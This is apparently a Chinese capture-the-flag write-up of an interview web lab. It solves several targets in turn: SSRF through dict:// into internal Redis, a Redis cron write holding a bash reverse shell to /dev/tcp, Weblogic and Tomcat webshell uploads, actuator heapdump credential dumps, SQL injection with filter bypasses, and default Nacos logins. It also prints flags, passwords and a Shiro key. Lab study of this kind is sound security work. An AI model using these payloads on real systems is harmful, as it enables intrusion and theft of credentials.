# 某科技公司二面WEB靶场详解-先知社区

> **来源**: https://xz.aliyun.com/news/16521  
> **文章ID**: 16521

---

# Web1

## FLAG1

直接读取根目录下的flag文件。

![](images/20250110194539-69ca78c2-cf48-1.png)

`meetsec1{6d5e5c2bb397ba7727b58df59b35f66a}`

## FLAG2

先用file:///etc/hosts查看内网主机连接

![](images/20250110194547-6eed287c-cf48-1.png)

发现有一台172.18.240.5的机器，说明内网c段是在172.18.240.0/24（题目给了提示）

接下来用Yakit进行IP和端口探测

后面添加常见端口即可，这种SSRF题一般会出redis的知识点，可以优先探测一遍内网开放的6379端口

显然可以发现1和7的6379端口探测响应与其他IP不同

![](images/20250110194557-74feb5a0-cf48-1.png)

查看回显发现6379存活，查看两台redis的key

第一台redis下并没有什么关键信息

```
dict://172.18.240.1:6379/keys *

```

![](images/20250110194712-a1b2c12c-cf48-1.png)

可以发现第二台redis存在flag

```
dict://172.18.240.7:6379/keys *

```

![](images/20250110194706-9de91802-cf48-1.png)

可以直接get出来。

![](images/20250110194658-98d48950-cf48-1.png)

`meetsec2{2b7cc5b73fe867cc83546583b858c8ab}`

## FLAG3

第三个flag提示在根目录，那可以试试往redis写定时任务反弹shell到vps上

```
dict://172.18.240.7:6379/flushall
dict://172.18.240.7:6379/config set dir /var/spool/cron
dict://172.18.240.7:6379/config set dbfilename root
dict://172.18.240.7:6379/set x "\n* * * * * /bin/bash -i >& /dev/tcp/IP/5555 0>&1\n"
dict://172.18.240.7:6379/save

```

![](images/20250110194648-92e1e920-cf48-1.png)

`meetsec3{f22eec9fb7c498b3a747392ff53a746b}`

# Web2

## FLAG1

直接用weblogicTool梭哈。

![](images/20250110194742-b389122a-cf48-1.png)

`meetsec1{3e942fd37767def3a9f68cf5ee6ebee5}`

## FLAG2

注入冰蝎的内存马，连接成功

![](images/20250110194750-b7d899ae-cf48-1.png)

![](images/20250110194756-bb9c4072-cf48-1.png)

```
Fscan收集完信息后，
在/root/Oracle/Middleware/user_projects/domains/base_domain/config/jdbc/JDBC_Data_Source-0-3407-jdbc.xml文件中拿到用户名root和AES加密后的密码，还有第二台机器的数据库连接地址。

SerializedSystemIni.dat文件默认位置：
/root/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat

```

![](images/20250110194804-c0a664ee-cf48-1.png)

解密出来后得到密码Meetsec#1024

stowaway挂上代理直接用datagrip连接成功。

![](images/20250110194813-c588948c-cf48-1.png)

`meetsec2{9fffac75c84bfc66fef4998f3574c6c8}`

## FLAG3

读取根目录下的flag文件。

![](images/20250110194822-cae0dd5e-cf48-1.png)

`meetsec3{2e947aef43be6dc428a9c626ba7fb824}`

# Web3

## FLAG1

![](images/20250110194829-cf1452b6-cf48-1.png)

扫目录发现actuator/env和actuator/heapdump泄露

首先访问actuator/env得到第一个flag

![](images/20250110194839-d566c36a-cf48-1.png)

或者看actuator/heapdump泄露

```
java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump

```

![](images/20250110194849-db4b3d24-cf48-1.png)

`meetsec1{e20cdd96b8985a3557e5720726bb09a8}`

## FLAG2

找到数据库的账号密码。

![](images/20250110194857-e018ba3e-cf48-1.png)

```
com.zaxxer.hikari.HikariDataSource:
[password = MeetSec@2nd!2022, jdbcUrl = jdbc:mysql://mysql_heapdump:13306/db, username = meetsec]

```

![](images/20250110194904-e47f66cc-cf48-1.png)

`meetsec2{9edbd4b03b5f86a9abe079bc63ea847b}`

# Web5

## FLAG1

访问/admin/login.php来到后台登录界面，这里有个sql注入

账号密码处填

' anselectd extractvalue(1,concat(0x7e,(database()))) #

即可报错注入获得数据库名

' uniselecton+selselectect+1,'admin','e10adc3949ba59abbe56e057f20f883e',0,0 #

还可以通过伪造admin返回的md5加密后的密码，进行登录

![](images/20250110194913-e9d27fce-cf48-1.png)

![](images/20250110194920-eda5f720-cf48-1.png)

系统设置加一个php后缀

![](images/20250110194927-f1c3e560-cf48-1.png)

**<http://118.195.209.56:8082/admin/admin_file_upload.php>**

![](images/20250110194934-f65386d0-cf48-1.png)

![](images/20250110194942-faac5716-cf48-1.png)

![](images/20250110194948-feb0e476-cf48-1.png)

`meetsec1{476e2dceb225678cd466fc3cd2b4c59c}`

# Web6

## FLAG1

访问发现有Basic认证。

![](images/20250110194956-03256bc6-cf49-1.png)

![](images/20250110195002-06d1f730-cf49-1.png)

![](images/20250110195009-0b0844c6-cf49-1.png)

先构造一个账号+弱口令字典，格式为用户名:密码

然后bp爆破，用base64加密后传输

爆出来账号tomcat 弱口令qwe123

进入manager/html

构造一个war包上传，这里用冰蝎生成的一句话木马，打包成zip后改后缀war

![](images/20250110195019-10c07096-cf49-1.png)

![](images/20250110195025-14a25350-cf49-1.png)

`meetsec1{c7a8d2734ec5a4ed687a9a692ee733f8}`

# Web7

## FLAG1

LiqunKit一把梭

![](images/20250110195033-196cb29a-cf49-1.png)

`meetsec1{672728e3bde3f4cc2b59de572b4df6d6}`

# Web9

## FLAG1

![](images/20250110195045-20a358fc-cf49-1.png)

扫框架发现是nacos

默认密码为nacos nacos

登录成功

![](images/20250110195054-257b9fe2-cf49-1.png)

发现shiro key

JG/RsuIKp3DFaBfD3ctgeA==

![](images/20250110195100-290d8378-cf49-1.png)

meetsec1{97fde43b8e55cb2e2b26b7c232ea82fa}
